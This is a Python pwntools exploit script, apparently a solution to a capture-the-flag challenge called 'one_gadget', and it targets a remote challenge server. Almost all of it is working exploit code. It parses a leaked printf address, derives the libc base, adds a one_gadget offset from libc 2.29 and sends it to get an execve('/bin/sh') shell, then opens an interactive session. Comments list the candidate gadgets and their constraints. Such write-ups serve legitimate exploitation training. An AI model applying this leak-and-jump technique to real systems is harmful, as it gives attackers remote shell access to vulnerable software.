from pwn import *
context.arch = 'amd64'

# there is libc, and the program will call a address, 
# so just use the one gagdet as the program name,
# otherwise, the program will leak the printf's addr

# p = process('./one_gadget')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('node3.buuoj.cn',29879)
libc = ELF('./libc-2.29.so',checksec=False)

# one_gadgets = 0x45216
one_gadgets = 0x106ef8
# 0xe237f execve("/bin/sh", rcx, [rbp-0x70])
# constraints:
#   [rcx] == NULL || rcx == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xe2383 execve("/bin/sh", rcx, rdx)
# constraints:
#   [rcx] == NULL || rcx == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe2386 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0x106ef8 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

p.recvuntil("here is the gift for u:")
printf_addr = int(p.recvuntil('\n',drop=True),16)
log.success('printf_addr = %#x',printf_addr)

libc_base = printf_addr - libc.sym['printf']
one_gadgets_addr = libc_base + one_gadgets
log.info('one_gadget = %#x',one_gadgets_addr)

p.recvuntil("Give me your one gadget:")
p.sendline(str(one_gadgets_addr))
sleep(1)
p.interactive()
